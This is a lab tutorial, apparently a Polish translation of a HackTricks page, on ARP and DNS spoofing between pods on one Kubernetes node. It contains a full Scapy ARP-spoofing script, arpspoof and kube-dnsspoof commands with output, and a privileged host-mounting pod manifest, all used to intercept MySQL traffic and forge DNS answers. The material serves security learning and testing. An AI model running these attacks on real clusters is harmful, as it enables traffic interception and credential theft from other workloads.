# Kubernetes Network Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Wprowadzenie

W Kubernetes zaobserwowano, Å¼e domyÅ›lne zachowanie pozwala na nawiÄ…zywanie poÅ‚Ä…czeÅ„ miÄ™dzy **wszystkimi kontenerami znajdujÄ…cymi siÄ™ na tym samym wÄ™Åºle**. Dotyczy to niezaleÅ¼nie od rÃ³Å¼nic w przestrzeniach nazw. Taka Å‚Ä…cznoÅ›Ä‡ siÄ™ga **Warstwy 2** (Ethernet). W konsekwencji ta konfiguracja potencjalnie naraÅ¼a system na luki w zabezpieczeniach. Konkretnie, otwiera moÅ¼liwoÅ›Ä‡ dla **zÅ‚oÅ›liwego kontenera** do przeprowadzenia **ataku ARP spoofing** przeciwko innym kontenerom znajdujÄ…cym siÄ™ na tym samym wÄ™Åºle. Podczas takiego ataku zÅ‚oÅ›liwy kontener moÅ¼e oszukaÅ„czo przechwyciÄ‡ lub zmodyfikowaÄ‡ ruch sieciowy przeznaczony dla innych kontenerÃ³w.

Ataki ARP spoofing polegajÄ… na tym, Å¼e **napastnik wysyÅ‚a faÅ‚szywe wiadomoÅ›ci ARP** (Address Resolution Protocol) w lokalnej sieci. Skutkuje to powiÄ…zaniem **adresu MAC napastnika z adresem IP legalnego komputera lub serwera w sieci**. Po pomyÅ›lnym przeprowadzeniu takiego ataku napastnik moÅ¼e przechwytywaÄ‡, modyfikowaÄ‡ lub nawet zatrzymywaÄ‡ dane w tranzycie. Atak jest realizowany na Warstwie 2 modelu OSI, dlatego domyÅ›lna Å‚Ä…cznoÅ›Ä‡ w Kubernetes na tej warstwie budzi obawy dotyczÄ…ce bezpieczeÅ„stwa.

W scenariuszu zostanÄ… utworzone 4 maszyny:

* ubuntu-pe: Maszyna uprzywilejowana do ucieczki do wÄ™zÅ‚a i sprawdzania metryk (niepotrzebna do ataku)
* **ubuntu-attack**: **ZÅ‚oÅ›liwy** kontener w domyÅ›lnej przestrzeni nazw
* **ubuntu-victim**: **Ofiara** maszyna w przestrzeni nazw kube-system
* **mysql**: **Ofiara** maszyna w domyÅ›lnej przestrzeni nazw
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## Podstawowe Sieci Kubernetes

JeÅ›li chcesz uzyskaÄ‡ wiÄ™cej szczegÃ³Å‚Ã³w na temat tematÃ³w sieciowych wprowadzonych tutaj, przejdÅº do odniesieÅ„.

### ARP

OgÃ³lnie rzecz biorÄ…c, **sieÄ‡ pod-do-pod wewnÄ…trz wÄ™zÅ‚a** jest dostÄ™pna za poÅ›rednictwem **mostu**, ktÃ³ry Å‚Ä…czy wszystkie pody. Ten most nazywa siÄ™ â€œ**cbr0**â€. (NiektÃ³re wtyczki sieciowe zainstalujÄ… swÃ³j wÅ‚asny most.) **cbr0 moÅ¼e rÃ³wnieÅ¼ obsÅ‚ugiwaÄ‡ ARP** (ProtokÃ³Å‚ RozwiÄ…zywania AdresÃ³w). Gdy przychodzÄ…cy pakiet dociera do cbr0, moÅ¼e rozwiÄ…zaÄ‡ docelowy adres MAC za pomocÄ… ARP.

Fakt ten implikuje, Å¼e domyÅ›lnie **kaÅ¼dy pod dziaÅ‚ajÄ…cy w tym samym wÄ™Åºle** bÄ™dzie mÃ³gÅ‚ **komunikowaÄ‡ siÄ™** z kaÅ¼dym innym pod w tym samym wÄ™Åºle (niezaleÅ¼nie od przestrzeni nazw) na poziomie ethernetowym (warstwa 2).

{% hint style="warning" %}
Dlatego moÅ¼liwe jest przeprowadzenie atakÃ³w A**RP Spoofing miÄ™dzy podami w tym samym wÄ™Åºle.**
{% endhint %}

### DNS

W Å›rodowiskach kubernetes zazwyczaj znajdziesz 1 (lub wiÄ™cej) **usÅ‚ug DNS dziaÅ‚ajÄ…cych** zazwyczaj w przestrzeni nazw kube-system:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
W poprzednich informacjach moÅ¼esz zobaczyÄ‡ coÅ› interesujÄ…cego, **IP usÅ‚ugi** to **10.96.0.10**, ale **IP poda** uruchamiajÄ…cego usÅ‚ugÄ™ to **172.17.0.2.**

JeÅ›li sprawdzisz adres DNS wewnÄ…trz dowolnego poda, znajdziesz coÅ› takiego:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
Jednak **pod** **nie wie**, jak dotrzeÄ‡ do tego **adresu**, poniewaÅ¼ **zakres podÃ³w** w tym przypadku to 172.17.0.10/26.

Dlatego **pod** wyÅ›le **Å¼Ä…dania DNS do adresu 10.96.0.10**, ktÃ³re zostanÄ… **przetÅ‚umaczone** przez cbr0 **na** **172.17.0.2**.

{% hint style="warning" %}
Oznacza to, Å¼e **Å¼Ä…danie DNS** podu **zawsze** bÄ™dzie kierowane do **mostu**, aby **przetÅ‚umaczyÄ‡** **adres IP usÅ‚ugi na adres IP punktu koÅ„cowego**, nawet jeÅ›li serwer DNS znajduje siÄ™ w tej samej podsieci co **pod**.

ZnajÄ…c to i wiedzÄ…c, Å¼e **atak ARP jest moÅ¼liwy**, **pod** w wÄ™Åºle bÄ™dzie w stanie **przechwyciÄ‡ ruch** miÄ™dzy **kaÅ¼dym pod** w **podsieci** a **mostem** i **zmodyfikowaÄ‡** **odpowiedzi DNS** z serwera DNS (**DNS Spoofing**).

Ponadto, jeÅ›li **serwer DNS** znajduje siÄ™ w **tym samym wÄ™Åºle co atakujÄ…cy**, atakujÄ…cy moÅ¼e **przechwyciÄ‡ wszystkie Å¼Ä…dania DNS** dowolnego podu w klastrze (miÄ™dzy serwerem DNS a mostem) i zmodyfikowaÄ‡ odpowiedzi.
{% endhint %}

## ARP Spoofing w podach w tym samym wÄ™Åºle

Naszym celem jest **ukraÅ›Ä‡ przynajmniej komunikacjÄ™ z ubuntu-victim do mysql**.

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS Spoofing

Jak juÅ¼ wspomniano, jeÅ›li **skompromitujesz pod w tym samym wÄ™Åºle co pod serwera DNS**, moÅ¼esz **MitM** z **ARPSpoofing** mostu i podu DNS oraz **zmodyfikowaÄ‡ wszystkie odpowiedzi DNS**.

Masz naprawdÄ™ fajne **narzÄ™dzie** i **samouczek**, aby to przetestowaÄ‡ w [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/)

W naszym scenariuszu, **pobierz** **narzÄ™dzie** w podzie atakujÄ…cym i stwÃ³rz **plik o nazwie `hosts`** z **domenami**, ktÃ³re chcesz **spoofowaÄ‡**, takie jak:
```
cat hosts
google.com. 1.1.1.1
```
Wykonaj atak na maszynÄ™ ubuntu-victim:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
JeÅ›li sprÃ³bujesz stworzyÄ‡ wÅ‚asny skrypt do spoofingu DNS, jeÅ›li **po prostu zmodyfikujesz odpowiedÅº DNS**, to **nie zadziaÅ‚a**, poniewaÅ¼ **odpowiedÅº** bÄ™dzie miaÅ‚a **src IP** adres IP **zÅ‚oÅ›liwego** **podu** i **nie bÄ™dzie** **zaakceptowana**.\
Musisz wygenerowaÄ‡ **nowy pakiet DNS** z **src IP** DNS, do ktÃ³rego ofiara wysyÅ‚a zapytanie DNS (coÅ› w rodzaju 172.16.0.2, a nie 10.96.0.10, to jest IP usÅ‚ugi DNS K8s, a nie IP serwera DNS, wiÄ™cej na ten temat w wprowadzeniu).
{% endhint %}

## Przechwytywanie ruchu

NarzÄ™dzie [**Mizu**](https://github.com/up9inc/mizu) to prosty, ale potÄ™Å¼ny **wyÅ›wietlacz ruchu API dla Kubernetes**, ktÃ³ry umoÅ¼liwia **podglÄ…d caÅ‚ej komunikacji API** miÄ™dzy mikroserwisami, aby pomÃ³c w debugowaniu i rozwiÄ…zywaniu problemÃ³w.\
Zainstaluje agenty w wybranych podach i zbierze informacje o ich ruchu, a nastÄ™pnie wyÅ›wietli je na serwerze WWW. Jednak bÄ™dziesz potrzebowaÄ‡ wysokich uprawnieÅ„ K8s do tego (i nie jest to zbyt dyskretne).

## Odniesienia

* [https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1](https://www.cyberark.com/resources/threat-research-blog/attacking-kubernetes-clusters-through-your-network-plumbing-part-1)
* [https://blog.aquasec.com/dns-spoofing-kubernetes-clusters](https://blog.aquasec.com/dns-spoofing-kubernetes-clusters)

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
